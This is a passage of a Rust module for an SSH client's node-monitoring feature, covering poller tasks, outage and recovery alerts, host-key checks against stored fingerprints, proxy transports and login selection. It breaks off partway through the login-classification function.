//! Lightweight, polling-based monitoring for saved nodes.
//!
//! Each monitored node owns a dedicated SSH session — separate from any
//! interactive session the user may have open. A per-node poller task wakes
//! every `INTERVAL_SECS`, runs a single composite script over an exec
//! channel, parses the output, and emits one `monitor-sample-{node_id}`
//! event with the resolved metrics. The frontend keeps a short ring buffer
//! per metric (~5 min) for sparklines.
//!
//! Scope deliberately kept small for V1:
//!   * No proxy support (direct TCP only)
//!   * No fingerprint prompt — host must already be in `known_hosts`
//!   * Six built-in metrics, no custom command support
//!   * One round-trip per poll (cheap on the server, low overhead)
//!
//! Anything more ambitious (proxies, custom metrics, fingerprint UX) is a
//! V2 concern and would be additive rather than restructuring this module.

use std::collections::HashMap;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Duration;

use russh::client;
use russh::keys::PublicKeyOrCertificate;
use serde::{Deserialize, Serialize};
use tauri::{AppHandle, Emitter};
use tokio::io::AsyncReadExt;
use tokio::sync::{oneshot, Mutex, Notify};

// Defaults — overridable per-app via the `monitor_settings` table.
pub const DEFAULT_INTERVAL_SECS: u64 = 5;
pub const DEFAULT_CONNECT_TIMEOUT_SECS: u64 = 10;
pub const DEFAULT_POLL_TIMEOUT_SECS: u64 = 8;
pub const DEFAULT_OUTAGE_THRESHOLD: u32 = 3;

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct MonitorSettings {
    /// Time between successful polls. Hot-applied — change takes effect on
    /// the next cycle of each poller.
    pub interval_secs: u64,
    /// Per-connect TCP / SSH timeout. Hot-applied for the next reconnect.
    pub connect_timeout_secs: u64,
    /// Per-poll exec timeout (how long we wait for the probe script's
    /// stdout to drain).
    pub poll_timeout_secs: u64,
    /// Consecutive failed polls before flagging a node as "outage". The
    /// outage event also fires through the existing app log so the user
    /// has a historical record.
    pub outage_threshold: u32,
    /// Whether to emit toast notifications on outage / recovery. When off,
    /// events are still logged but no toast is shown.
    pub notify_on_outage: bool,
    /// Whether to play an audible beep when a node crosses into outage.
    /// Independent of the visual toast — some users want one without the
    /// other. The frontend coalesces beeps via `beep_cooldown_secs` so a
    /// bulk drop (e.g. the entire fleet flapping at once) plays a single
    /// alert rather than spamming.
    #[serde(default = "default_false")]
    pub beep_on_outage: bool,
    /// Minimum seconds between consecutive beeps. The frontend rate-limits
    /// using this — any outage events landing inside the cooldown window
    /// are silently logged but don't play sound. Bumping this is the
    /// answer to "the alarm keeps screaming".
    #[serde(default = "default_beep_cooldown")]
    pub beep_cooldown_secs: u32,
}

// `#[serde(default = ...)]` attributes need a function reference, not a
// literal — these tiny helpers exist purely to satisfy that requirement
// while keeping the JSON migration story painless for users upgrading
// from a profile that doesn't have the new fields yet.
fn default_false() -> bool { false }
fn default_beep_cooldown() -> u32 { 10 }

impl Default for MonitorSettings {
    fn default() -> Self {
        Self {
            interval_secs: DEFAULT_INTERVAL_SECS,
            connect_timeout_secs: DEFAULT_CONNECT_TIMEOUT_SECS,
            poll_timeout_secs: DEFAULT_POLL_TIMEOUT_SECS,
            outage_threshold: DEFAULT_OUTAGE_THRESHOLD,
            notify_on_outage: true,
            beep_on_outage: false,
            beep_cooldown_secs: 10,
        }
    }
}

impl MonitorSettings {
    /// Clamp incoming user values to sane bounds so a typo can't break
    /// the poller (e.g. interval=0 spinning, or huge timeouts that hang
    /// the whole UI for minutes).
    pub fn sanitized(mut self) -> Self {
        self.interval_secs = self.interval_secs.clamp(1, 600);
        self.connect_timeout_secs = self.connect_timeout_secs.clamp(2, 120);
        self.poll_timeout_secs = self.poll_timeout_secs.clamp(2, 120);
        self.outage_threshold = self.outage_threshold.clamp(1, 100);
        // Cap the beep cooldown well above the polling interval so even a
        // typo can't disable the alarm entirely.
        self.beep_cooldown_secs = self.beep_cooldown_secs.clamp(0, 600);
        self
    }
}

pub type SharedSettings = Arc<Mutex<MonitorSettings>>;

/// The device's "Use keys from an ssh-agent" setting (src/util/sshAgent.ts),
/// as the page last gave it. Device-local, so not in `MonitorSettings`, which
/// is saved in the profile. A poller reads it at each connect, so a change
/// reaches running monitors at their next connect. Off until the page says,
/// so no agent is asked before then.
static USE_AGENT: AtomicBool = AtomicBool::new(false);

/// Set the device's "Use keys from an ssh-agent" setting for monitoring. The
/// page gives it at start, whenever it changes, and with each resume. Always
/// off on a phone or tablet, which has no ssh-agent.
pub fn set_use_agent(on: bool) {
    USE_AGENT.store(on && cfg!(desktop), Ordering::Relaxed);
}

// ---------------------------------------------------------------------------
// Shared state
// ---------------------------------------------------------------------------

/// One entry per monitored node. The `paused` flag is hot-toggleable from
/// the UI without restarting the poller. `stop_tx` is consumed once when
/// the monitor is removed; the poller task exits cleanly on receive.
pub struct MonitorEntry {
    pub node_id: i32,
    pub enabled_metrics: Arc<Mutex<Vec<String>>>,
    pub custom_metrics: Arc<Mutex<Vec<CustomMetric>>>,
    pub paused: Arc<Mutex<bool>>,
    /// Told when `paused` goes off, for a poller that sleeps on it (`wait_while_paused`).
    pub resumed: Notify,
    pub state: Arc<Mutex<MonitorState>>,
    /// Wrapped in `Mutex<Option<...>>` so the sender can be `take()`-en
    /// from any holder (the entry is shared via `Arc` between the map
    /// and the spawned poller, so `Arc::try_unwrap` is unreliable). On
    /// `stop_monitor` we lock, take, and `send(())` — the poller's
    /// `tokio::select!` arm on `stop_rx` fires immediately and the
    /// task exits cleanly instead of hanging until the next interval.
    pub stop_tx: Mutex<Option<oneshot::Sender<()>>>,
    /// Set when the ssh-agent was asked to sign this node's login and didn't
    /// (refused, or no answer in time), with the message to show. Until a
    /// resume clears it (`set_paused`), the poller doesn't ask the agent
    /// again: a smartcard's PIN or an agent that confirms each use would
    /// otherwise prompt at every reconnect in the background.
    pub agent_stopped: Mutex<Option<String>>,
}

#[derive(Debug, Clone, Serialize, Default)]
pub struct MonitorState {
    pub connected: bool,
    pub last_error: Option<String>,
    pub last_sample_ts: Option<u64>,
    /// Consecutive failed connect / poll attempts. Reset on every successful
    /// sample. Reaches `outage_threshold` → outage event fires.
    pub consecutive_failures: u32,
    /// `now_ms()` of the first failure in the current outage streak. None
    /// means "no active outage". Used both for the recovered-event payload
    /// (duration) and for the UI to show "offline for Xm".
    pub outage_since_ms: Option<u64>,
}

pub type MonitorMap = Arc<Mutex<HashMap<i32, Arc<MonitorEntry>>>>;

/// Live snapshot of one node as returned by `monitor_list`.
#[derive(Debug, Clone, Serialize)]
pub struct MonitorInfo {
    pub node_id: i32,
    pub enabled_metrics: Vec<String>,
    pub custom_metrics: Vec<CustomMetric>,
    pub paused: bool,
    pub connected: bool,
    pub last_error: Option<String>,
    pub last_sample_ts: Option<u64>,
    pub consecutive_failures: u32,
    pub outage_since_ms: Option<u64>,
}

#[derive(Debug, Clone, Serialize)]
pub struct Sample {
    pub node_id: i32,
    pub ts: u64,
    /// Map of metric_key → value. Net is reported as two synthetic keys
    /// ("net_in", "net_out") so the UI can render both as separate sparklines.
    /// Custom metrics with numeric `parse` mode show up here with their id.
    pub values: HashMap<String, f64>,
    /// Per-metric error string when a single metric failed to parse (e.g.
    /// `/proc/swaps` empty on a host with no swap). The connection may still
    /// be healthy.
    pub errors: HashMap<String, String>,
    /// Text-mode custom metrics — id → trimmed string. We don't push these
    /// into `values` because they're not numeric and don't go into the
    /// sparkline ring buffer.
    pub texts: HashMap<String, String>,
}

// ---------------------------------------------------------------------------
// Public spec passed in from the command layer. Decoupled from DB rows so
// callers can build it from anywhere.
// ---------------------------------------------------------------------------

#[derive(Clone, Deserialize)]
pub struct NodeAuth {
    pub host: String,
    pub port: u16,
    pub username: String,
    pub password: Option<String>,
    /// PEM-encoded private key body (already pulled from `ssh_keys` table by
    /// the caller) — and its optional passphrase.
    pub private_key: Option<String>,
    pub passphrase: Option<String>,
    /// "none", "socks5", or "http". Mirrors the interactive connect path so
    /// monitoring works through the same proxy the user configured for SSH.
    pub proxy_type: String,
    pub proxy_host: Option<String>,
    pub proxy_port: Option<u16>,
    #[serde(default)]
    pub transport: String,
    #[serde(default)]
    pub tailcat_address: Option<String>,
}

impl std::fmt::Debug for NodeAuth {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("NodeAuth")
            .field("host", &self.host)
            .field("port", &self.port)
            .field("username", &self.username)
            .field("password", &self.password.as_ref().map(|_| "[redacted]"))
            .field("private_key", &self.private_key.as_ref().map(|_| "[redacted]"))
            .field("passphrase", &self.passphrase.as_ref().map(|_| "[redacted]"))
            .field("proxy_type", &self.proxy_type)
            .field("proxy_host", &self.proxy_host)
            .field("proxy_port", &self.proxy_port)
            .field("transport", &self.transport)
            .field("tailcat_address", &self.tailcat_address.as_ref().map(|_| "[redacted]"))
            .finish()
    }
}

/// A user-defined metric. The probe loop wraps each command in BEGIN/END
/// markers so we can carve its output back out of the composite script's
/// single stdout stream — keeping us at one round-trip per poll cycle.
#[derive(Debug, Clone, Deserialize, Serialize)]
pub struct CustomMetric {
    /// Stable identifier used as the event key. Frontend generates it.
    pub id: String,
    pub name: String,
    /// Shell snippet, run under the login shell. Whatever it writes to
    /// stdout (and only stdout) lands in this metric's slice of the output.
    pub command: String,
    /// "number" (first numeric token), "regex" (first capture group as
    /// number), "text" (raw trimmed stdout).
    pub parse: String,
    /// Only consulted when parse=="regex".
    #[serde(default)]
    pub regex: Option<String>,
    /// Display hint for the frontend — "sparkline", "big_number", "text".
    pub display: String,
    /// Optional unit suffix shown after the number.
    #[serde(default)]
    pub unit: Option<String>,
}

// ---------------------------------------------------------------------------
// Public entry points
// ---------------------------------------------------------------------------

/// Start (or resume) monitoring a node. Spawns the poller task and stashes
/// the entry in the map. Returns immediately — the connect happens inside
/// the spawned task so a slow / unreachable host doesn't block the caller.
pub async fn start_monitor(
    app: AppHandle,
    map: MonitorMap,
    db: Arc<std::sync::Mutex<Option<rusqlite::Connection>>>,
    settings: SharedSettings,
    node_id: i32,
    node_name: String,
    auth: NodeAuth,
    enabled_metrics: Vec<String>,
    custom_metrics: Vec<CustomMetric>,
    paused: bool,
) {
    // If a poller already exists for this node, stop it first so we never
    // double-poll.
    let existing = map.lock().await.remove(&node_id);
    if let Some(prev) = existing {
        if let Some(tx) = prev.stop_tx.lock().await.take() {
            let _ = tx.send(());
        }
    }

    let (stop_tx, stop_rx) = oneshot::channel::<()>();
    let entry = Arc::new(MonitorEntry {
        node_id,
        enabled_metrics: Arc::new(Mutex::new(enabled_metrics)),
        custom_metrics: Arc::new(Mutex::new(custom_metrics)),
        paused: Arc::new(Mutex::new(paused)),
        resumed: Notify::new(),
        state: Arc::new(Mutex::new(MonitorState::default())),
        stop_tx: Mutex::new(Some(stop_tx)),
        agent_stopped: Mutex::new(None),
    });

    map.lock().await.insert(node_id, Arc::clone(&entry));

    let app_for_task = app.clone();
    let entry_for_task = Arc::clone(&entry);
    tauri::async_runtime::spawn(async move {
        run_poller(app_for_task, entry_for_task, db, settings, node_name, auth, stop_rx).await;
    });
}

pub async fn stop_monitor(map: MonitorMap, node_id: i32) {
    let removed = map.lock().await.remove(&node_id);
    if let Some(arc_entry) = removed {
        // Take the sender out of the Option and signal the poller.
        // The poller's `tokio::select!` arm on `stop_rx` fires within
        // the same tick — no waiting for the next interval like the
        // previous "paused=true and hope" pattern.
        if let Some(tx) = arc_entry.stop_tx.lock().await.take() {
            let _ = tx.send(());
        }
        // Also flip paused so any in-flight loop iteration short-circuits
        // before the select arm has a chance to run.
        *arc_entry.paused.lock().await = true;
    }
}

/// Ends every poller and empties the list (a profile is locked or switched).
/// Each one is told to stop, so one that is in the middle of a connect or a poll
/// that the server never answers hears it too, lets go of its connection and
/// of the node's password or key, and stops sending events. Pausing alone
/// left it to find out at the top of its loop, which it never reached.
pub async fn stop_all(map: MonitorMap) {
    let all: Vec<Arc<MonitorEntry>> = map.lock().await.drain().map(|(_, e)| e).collect();
    for e in all {
        if let Some(tx) = e.stop_tx.lock().await.take() {
            let _ = tx.send(());
        }
        *e.paused.lock().await = true;
    }
}

/// `fut` with a deadline, for steps that wait on a server and had none: a
/// connection that was accepted and never answered kept the poller waiting for
/// good, so the node was never reported as down.
async fn within<T, E: From<String>>(limit: Duration, fut: impl std::future::Future<Output = Result<T, E>>) -> Result<T, E> {
    tokio::time::timeout(limit, fut)
        .await
        .unwrap_or_else(|_| Err(E::from("The server didn't answer in time".to_string())))
}

pub async fn set_paused(map: MonitorMap, node_id: i32, paused: bool) -> Result<(), String> {
    let entry = map
        .lock()
        .await
        .get(&node_id)
        .cloned()
        .ok_or_else(|| format!("Node {} is not being monitored", node_id))?;
    *entry.paused.lock().await = paused;
    if !paused {
        // A resume lets the poller ask the ssh-agent again (`agent_stopped`).
        *entry.agent_stopped.lock().await = None;
        entry.resumed.notify_one();
    }
    Ok(())
}

pub async fn set_enabled_metrics(
    map: MonitorMap,
    node_id: i32,
    metrics: Vec<String>,
) -> Result<(), String> {
    let entry = map
        .lock()
        .await
        .get(&node_id)
        .cloned()
        .ok_or_else(|| format!("Node {} is not being monitored", node_id))?;
    *entry.enabled_metrics.lock().await = metrics;
    Ok(())
}

pub async fn set_custom_metrics(
    map: MonitorMap,
    node_id: i32,
    metrics: Vec<CustomMetric>,
) -> Result<(), String> {
    let entry = map
        .lock()
        .await
        .get(&node_id)
        .cloned()
        .ok_or_else(|| format!("Node {} is not being monitored", node_id))?;
    *entry.custom_metrics.lock().await = metrics;
    Ok(())
}

pub async fn list(map: MonitorMap) -> Vec<MonitorInfo> {
    let map = map.lock().await;
    let mut out = Vec::with_capacity(map.len());
    for entry in map.values() {
        out.push(entry_status(entry).await);
    }
    out
}

pub async fn pause_all(map: MonitorMap) {
    let snap: Vec<Arc<MonitorEntry>> = map.lock().await.values().cloned().collect();
    for e in snap {
        *e.paused.lock().await = true;
    }
}

async fn entry_status(entry: &MonitorEntry) -> MonitorInfo {
    let metrics = entry.enabled_metrics.lock().await.clone();
    let customs = entry.custom_metrics.lock().await.clone();
    let paused = *entry.paused.lock().await;
    let s = entry.state.lock().await;
    MonitorInfo {
        node_id: entry.node_id,
        enabled_metrics: metrics,
        custom_metrics: customs,
        paused,
        connected: s.connected,
        last_error: s.last_error.clone(),
        last_sample_ts: s.last_sample_ts,
        consecutive_failures: s.consecutive_failures,
        outage_since_ms: s.outage_since_ms,
    }
}

// ---------------------------------------------------------------------------
// Poller loop
// ---------------------------------------------------------------------------

/// A paused poller sleeps here until it is resumed (true) or stopped (false).
/// On a signal and not a timer: a timer woke the CPU each second for each
/// paused node, for as long as it was listed. A resume that comes just before
/// this wait isn't lost, `notify_one` keeps it for the next `notified`.
async fn wait_while_paused(entry: &MonitorEntry, stop_rx: &mut oneshot::Receiver<()>) -> bool {
    tokio::select! {
        _ = stop_rx => false,
        _ = entry.resumed.notified() => true,
    }
}

async fn run_poller(
    app: AppHandle,
    entry: Arc<MonitorEntry>,
    db: Arc<std::sync::Mutex<Option<rusqlite::Connection>>>,
    settings: SharedSettings,
    node_name: String,
    auth: NodeAuth,
    mut stop_rx: oneshot::Receiver<()>,
) {
    let node_id = entry.node_id;
    let mut last: Option<RawSnapshot> = None;
    let mut handle: Option<russh::client::Handle<MonitorHandler>> = None;
    let mut backoff = Duration::from_secs(2);
    let backoff_max = Duration::from_secs(60);

    // Helper: record a failure, fire outage event if we just crossed the
    // threshold. Caller still has the responsibility to surface the actual
    // error to the user via mark_disconnected.
    async fn record_failure(
        app: &AppHandle,
        entry: &MonitorEntry,
        node_name: &str,
        threshold: u32,
        err: &str,
        notify: bool,
        beep: bool,
    ) {
        let (just_crossed, since_ms) = {
            let mut s = entry.state.lock().await;
            s.consecutive_failures = s.consecutive_failures.saturating_add(1);
            if s.outage_since_ms.is_none() {
                s.outage_since_ms = Some(now_ms());
            }
            let crossed = s.consecutive_failures == threshold;
            (crossed, s.outage_since_ms.unwrap_or_else(now_ms))
        };
        if just_crossed {
            // Outage event: one-shot per outage streak. The frontend toasts
            // it (when notify=true), logs it always, and the card shows a
            // persistent "Offline for Xm" badge. `beep` is a hint — the
            // frontend still applies its own cooldown to collapse bursts.
            let _ = app.emit(
                &format!("monitor-outage-{}", entry.node_id),
                serde_json::json!({
                    "node_id": entry.node_id,
                    "node_name": node_name,
                    "since_ms": since_ms,
                    "consecutive_failures": threshold,
                    "last_error": err,
                    "notify": notify,
                    "beep": beep,
                }),
            );
        }
    }

    // Recovery event: one-shot when we go from outage_since=Some → None.
    async fn record_recovery(
        app: &AppHandle,
        entry: &MonitorEntry,
        node_name: &str,
        notify: bool,
        was_outage_threshold: bool,
    ) {
        let (was_outage, since_ms, duration_ms) = {
            let mut s = entry.state.lock().await;
            let was = s.outage_since_ms.is_some();
            let since = s.outage_since_ms;
            s.consecutive_failures = 0;
            s.outage_since_ms = None;
            let duration = since.map(|t| now_ms().saturating_sub(t)).unwrap_or(0);
            (was, since.unwrap_or(0), duration)
        };
        if was_outage && was_outage_threshold {
            let _ = app.emit(
                &format!("monitor-recovered-{}", entry.node_id),
                serde_json::json!({
                    "node_id": entry.node_id,
                    "node_name": node_name,
                    "since_ms": since_ms,
                    "duration_ms": duration_ms,
                    "notify": notify,
                }),
            );
        }
    }

    loop {
        // Record the deadline BEFORE running the poll. If the poll
        // takes longer than `interval` we want the next tick to fire
        // immediately (catching up), not to drift by the cost of the
        // slow poll. Equivalent to tokio::time::interval with
        // MissedTickBehavior::Delay, but resilient to mid-flight
        // interval changes from hot-applied settings.
        let tick_started_at = std::time::Instant::now();

        // 1) Honour stop / pause / removal.
        if stop_rx.try_recv().is_ok() {
            break;
        }
        if Arc::strong_count(&entry) == 1 {
            break;
        }
        if *entry.paused.lock().await {
            mark_disconnected(&app, &entry, None).await;
            handle = None;
            // Pause should NOT count as outage: clear streak so a resume
            // doesn't instantly fire a recovered event.
            {
                let mut s = entry.state.lock().await;
                s.consecutive_failures = 0;
                s.outage_since_ms = None;
            }
            if !wait_while_paused(&entry, &mut stop_rx).await {
                break;
            }
            continue;
        }

        // 2) Pull current settings (hot-applied each cycle).
        let cfg = settings.lock().await.clone();
        let threshold = cfg.outage_threshold;
        let notify = cfg.notify_on_outage;
        let beep = cfg.beep_on_outage;
        let connect_timeout = Duration::from_secs(cfg.connect_timeout_secs);
        let poll_timeout = Duration::from_secs(cfg.poll_timeout_secs);
        let interval = Duration::from_secs(cfg.interval_secs);

        // 3) Ensure we have a live SSH handle. Race the connect against the
        // stop signal so a Stop (profile switch, app close, toggle-off) during
        // a slow or hung handshake tears the poller down at once, instead of
        // waiting out the connect/handshake budget (up to connect_timeout * 2).
        if handle.as_ref().map(|h| h.is_closed()).unwrap_or(true) {
            let (target, agent_config) = match with_ssh_config(&auth, &node_name).await {
                Ok(t) => t,
                Err(why) => {
                    // Not a failure: no outage count, no alert. Looked at
                    // again each interval, in case the config changes.
                    mark_disconnected(&app, &entry, Some(why)).await;
                    tokio::select! {
                        _ = &mut stop_rx => break,
                        _ = tokio::time::sleep(interval) => {}
                    }
                    continue;
                }
            };
            // Read at each connect, so a change in Settings counts from the next one.
            let use_agent = USE_AGENT.load(Ordering::Relaxed);
            let via_agent = login_uses_agent(&target, use_agent);
            if via_agent {
                let stopped = entry.agent_stopped.lock().await.clone();
                if let Some(why) = stopped {
                    // The agent didn't sign last time: it isn't asked again
                    // until a resume (or a stop). Counted as a failure then,
                    // not again now.
                    mark_disconnected(&app, &entry, Some(why)).await;
                    if !wait_while_paused(&entry, &mut stop_rx).await {
                        break;
                    }
                    continue;
                }
            }
            let connected = tokio::select! {
                _ = &mut stop_rx => break,
                r = within(
                    connect_limit(connect_timeout, via_agent),
                    connect_for_monitor(&db, &target, &agent_config, connect_timeout, use_agent),
                ) => r,
            };
            match connected {
                Ok(h) => {
                    handle = Some(h);
                    backoff = Duration::from_secs(2);
                    let was_outage_threshold = {
                        let s = entry.state.lock().await;
                        s.consecutive_failures >= threshold
                    };
                    record_recovery(&app, &entry, &node_name, notify, was_outage_threshold).await;
                    mark_connected(&app, &entry).await;
                    // Reset differential baseline so the first sample after
                    // reconnect doesn't produce a giant nonsense CPU/net spike.
                    last = None;
                }
                Err(ConnectError { message, agent_unsigned }) => {
                    if agent_unsigned {
                        *entry.agent_stopped.lock().await = Some(message.clone());
                    }
                    record_failure(&app, &entry, &node_name, threshold, &message, notify, beep).await;
                    mark_disconnected(&app, &entry, Some(message)).await;
                    tokio::select! {
                        _ = &mut stop_rx => break,
                        _ = tokio::time::sleep(backoff) => {}
                    }
                    backoff = (backoff * 2).min(backoff_max);
                    continue;
                }
            }
        }

        // 4) Poll once. Snapshot enabled + custom lists here so mid-cycle
        // hot-updates from the UI take effect on the NEXT cycle.
        let customs_snap: Vec<CustomMetric> = entry.custom_metrics.lock().await.clone();
        let h = handle.as_ref().unwrap();
        // Same as the connect: a Stop during a slow poll ends the poller now,
        // rather than after the per-poll exec timeout.
        let polled = tokio::select! {
            _ = &mut stop_rx => break,
            // Opening the channel and starting the probe had no limit; reading its answer has `poll_timeout`.
            r = within(poll_timeout * 3, poll_once(h, &customs_snap, poll_timeout)) => r,
        };
        match polled {
            Ok(raw) => {
                let enabled_snap = entry.enabled_metrics.lock().await.clone();
                let sample = compute_sample(node_id, &raw, &last, &enabled_snap, &customs_snap);
                last = Some(raw);
                {
                    let mut s = entry.state.lock().await;
                    s.last_sample_ts = Some(sample.ts);
                    s.connected = true;
                    s.last_error = None;
                }
                let was_outage_threshold = {
                    let s = entry.state.lock().await;
                    s.consecutive_failures >= threshold
                };
                record_recovery(&app, &entry, &node_name, notify, was_outage_threshold).await;
                let _ = app.emit(&format!("monitor-sample-{}", node_id), sample);
            }
            Err(e) => {
                eprintln!("[monitor] poll failed for node {}: {}", node_id, e);
                handle = None;
                record_failure(&app, &entry, &node_name, threshold, &e, notify, beep).await;
                mark_disconnected(&app, &entry, Some(e)).await;
            }
        }

        // 5) Wait until the deadline computed at the START of this
        // iteration. A poll that overran `interval` sleeps zero and
        // the next tick fires immediately — drift bounded to one
        // interval regardless of how slow a single probe gets.
        let now = std::time::Instant::now();
        let next_tick = tick_started_at + interval;
        let wait = if next_tick > now { next_tick - now } else { Duration::ZERO };
        tokio::select! {
            _ = &mut stop_rx => break,
            _ = tokio::time::sleep(wait) => {}
        }
    }

    mark_disconnected(&app, &entry, None).await;
}

async fn mark_connected(app: &AppHandle, entry: &MonitorEntry) {
    {
        let mut s = entry.state.lock().await;
        s.connected = true;
        s.last_error = None;
    }
    let _ = app.emit(
        &format!("monitor-status-{}", entry.node_id),
        entry_status(entry).await,
    );
}

async fn mark_disconnected(app: &AppHandle, entry: &MonitorEntry, err: Option<String>) {
    let already = {
        let s = entry.state.lock().await;
        !s.connected && s.last_error == err
    };
    if already {
        return; // avoid spamming identical status events
    }
    {
        let mut s = entry.state.lock().await;
        s.connected = false;
        s.last_error = err;
    }
    let _ = app.emit(
        &format!("monitor-status-{}", entry.node_id),
        entry_status(entry).await,
    );
}

// ---------------------------------------------------------------------------
// SSH connect (minimal, no proxy)
// ---------------------------------------------------------------------------

/// Tiny handler that only authorises hosts whose fingerprint is already in
/// `known_hosts`. There's no UI plumbing here — for V1 the user must have
/// connected interactively at least once so the fingerprint is approved.
pub struct MonitorHandler {
    db: Arc<std::sync::Mutex<Option<rusqlite::Connection>>>,
    host: String,
    port: u16,
}

impl client::Handler for MonitorHandler {
    type Error = russh::Error;

    async fn check_server_key(
        &mut self,
        offered: &PublicKeyOrCertificate,
    ) -> Result<bool, Self::Error> {
        // Host certificates are refused (no CA trust store) — same policy as
        // the interactive ClientHandler; see ssh_manager::plain_host_key.
        let Some(server_public_key) = crate::ssh_manager::plain_host_key(offered) else {
            eprintln!(
                "[monitor] {}:{} presented a host certificate; certificates can't be verified (no trusted CA), refusing",
                self.host, self.port
            );
            return Ok(false);
        };
        // Must be byte-identical to what the interactive path stored in
        // known_hosts — this handler only trusts fingerprints already on file,
        // matched by fingerprint alone (the key identity), so the RSA key_type
        // spelling change between russh versions is moot here.
        let fp = crate::ssh_manager::host_key_fingerprint(server_public_key);
        let mut ok = false;
        if let Ok(guard) = self.db.lock() {
            if let Some(conn) = guard.as_ref() {
                if let Ok(mut stmt) = conn.prepare(
                    "SELECT 1 FROM known_hosts WHERE host=?1 AND port=?2 AND fingerprint=?3",
                ) {
                    if let Ok(mut rows) = stmt.query(rusqlite::params![self.host, self.port, fp]) {
                        if let Ok(Some(_)) = rows.next() {
                            ok = true;
                        }
                    }
                }
            }
        }
        Ok(ok)
    }
}

/// Trait-object wrapper so we can hand russh's `connect_stream` either a
/// direct TcpStream, a tokio_socks SOCKS5 stream, or a CONNECT-tunneled
/// TcpStream — depending on the node's proxy config — via the same path.
trait AsyncStream: tokio::io::AsyncRead + tokio::io::AsyncWrite + Unpin + Send + 'static {}
impl<T: tokio::io::AsyncRead + tokio::io::AsyncWrite + Unpin + Send + 'static> AsyncStream for T {}

struct StreamBox(Box<dyn AsyncStream>);
impl tokio::io::AsyncRead for StreamBox {
    fn poll_read(
        mut self: std::pin::Pin<&mut Self>,
        cx: &mut std::task::Context<'_>,
        buf: &mut tokio::io::ReadBuf<'_>,
    ) -> std::task::Poll<std::io::Result<()>> {
        std::pin::Pin::new(&mut *self.0).poll_read(cx, buf)
    }
}
impl tokio::io::AsyncWrite for StreamBox {
    fn poll_write(
        mut self: std::pin::Pin<&mut Self>,
        cx: &mut std::task::Context<'_>,
        buf: &[u8],
    ) -> std::task::Poll<std::io::Result<usize>> {
        std::pin::Pin::new(&mut *self.0).poll_write(cx, buf)
    }
    fn poll_flush(
        mut self: std::pin::Pin<&mut Self>,
        cx: &mut std::task::Context<'_>,
    ) -> std::task::Poll<std::io::Result<()>> {
        std::pin::Pin::new(&mut *self.0).poll_flush(cx)
    }
    fn poll_shutdown(
        mut self: std::pin::Pin<&mut Self>,
        cx: &mut std::task::Context<'_>,
    ) -> std::task::Poll<std::io::Result<()>> {
        std::pin::Pin::new(&mut *self.0).poll_shutdown(cx)
    }
}

/// Build the underlying transport, honouring the node's proxy settings.
/// Same matrix as the interactive connect path, kept narrow to the three
/// kinds we already support there.
async fn open_transport(auth: &NodeAuth, connect_timeout: Duration) -> Result<Box<dyn AsyncStream>, String> {
    if auth.transport == "tailcat" {
        if auth.proxy_type != "none" {
            return Err("Tailcat connections cannot use a proxy".into());
        }
        #[cfg(feature = "tailcat-capi")]
        {
            let address = auth.tailcat_address.as_deref()
                .filter(|value| value.trim().starts_with("tc"))
                .ok_or("Tailcat address is missing or invalid")?;
            let stream = tokio::time::timeout(
                connect_timeout,
                crate::tailcat_capi::open_tcp(address, auth.port),
            )
            .await
            .map_err(|_| "Tailcat connection timed out".to_string())??;
            return Ok(Box::new(stream));
        }
        #[cfg(not(feature = "tailcat-capi"))]
        {
            return Err("This Submarine build was not compiled with Tailcat support".into());
        }
    }
    match auth.proxy_type.as_str() {
        "socks5" => {
            let p_host = auth.proxy_host.as_deref().filter(|s| !s.is_empty())
                .ok_or("SOCKS5 proxy host is empty")?;
            let p_port = auth.proxy_port.unwrap_or(1080);
            let proxy_addr = format!("{}:{}", p_host, p_port);
            let stream = tokio::time::timeout(
                connect_timeout,
                crate::dial::socks5(proxy_addr.as_str(), (auth.host.as_str(), auth.port)),
            )
            .await
            .map_err(|_| format!("SOCKS5 proxy {} timed out", proxy_addr))?
            .map_err(|e| format!("SOCKS5: {}", e))?;
            // Socks5Stream derefs to the proxy socket (see monitor_client_config).
            crate::apply_tcp_keepalive(&stream);
            Ok(Box::new(stream))
        }
        "http" => {
            let p_host = auth.proxy_host.as_deref().filter(|s| !s.is_empty())
                .ok_or("HTTP proxy host is empty")?;
            let p_port = auth.proxy_port.unwrap_or(8080);
            let proxy_addr = format!("{}:{}", p_host, p_port);
            let mut tcp = tokio::time::timeout(
                connect_timeout,
                crate::dial::connect(proxy_addr.as_str()),
            )
            .await
            .map_err(|_| format!("HTTP proxy {} timed out", proxy_addr))?
            .map_err(|e| format!("HTTP proxy TCP: {}", e))?;
            let _ = tcp.set_nodelay(true);
            crate::apply_tcp_keepalive(&tcp);
            if !crate::http_connect_host_ok(&auth.host) {
                return Err(format!("'{}' can't be asked of an HTTP proxy: a host has no spaces or control characters.", auth.host.escape_debug()));
            }
            tokio::time::timeout(
                connect_timeout,
                crate::dial::http_tunnel(&mut tcp, &auth.host, auth.port),
            )
            .await
            .map_err(|_| format!("HTTP CONNECT to {}:{} timed out", auth.host, auth.port))?
            .map_err(|e| format!("HTTP CONNECT: {}", e))?;
            Ok(Box::new(tcp))
        }
        _ => {
            let stream = tokio::time::timeout(
                connect_timeout,
                crate::dial::connect((auth.host.as_str(), auth.port)),
            )
            .await
            .map_err(|_| format!("TCP connect to {}:{} timed out", auth.host, auth.port))?
            .map_err(|e| format!("TCP: {}", e))?;
            let _ = stream.set_nodelay(true);
            crate::apply_tcp_keepalive(&stream);
            Ok(Box::new(stream))
        }
    }
}

/// How the monitor logs in to a node.
#[derive(Debug, PartialEq)]
enum Login {
    /// The node's saved key, with its saved passphrase if any.
    Key { pem: String, passphrase: Option<String> },
    /// The node's saved password: only when no key is saved.
    Password(String),
    /// Neither is saved: the keys an ssh-agent on this device holds, without
    /// its security keys (`log_in_with_agent`). Only with the device's "Use
    /// keys from an ssh-agent" setting on.
    Agent,
}

/// How to log in, from the resolved `NodeAuth` and the device's "Use keys from
/// an ssh-agent" setting (`use_agent`). A vault entry of type "key" yields the
/// key and its passphrase; a "password" entry yields the password. An empty
/// key body or password counts as none.
fn classify_auth(auth: &NodeAuth, use_agent: bool) -> Result<Login, String> {
    if let Some(pem) = auth.private_key.as_deref().map(str::trim).filter(|s| !s.is_empty()) {
        return Ok(Login::Key { pem: pem.to_string(), passphrase: auth.passphrase.clone() });
    }
    if let Some(password) = auth.password.as_ref().filter(|p| !p.is_empty()) {
